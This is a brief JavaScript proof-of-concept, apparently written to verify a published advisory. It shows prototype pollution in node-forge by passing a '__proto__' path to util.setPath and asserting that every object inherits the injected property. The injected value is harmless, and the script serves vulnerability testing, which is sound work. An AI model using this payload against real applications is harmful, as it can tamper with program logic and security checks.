//https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
const nodeforge = require('node-forge');
const { assert } = require("@firebase/util");

var obj = {}
console.log("Before : " + obj.polluted);
nodeforge.util.setPath(obj, ['__proto__', 'polluted'], "yes");
console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");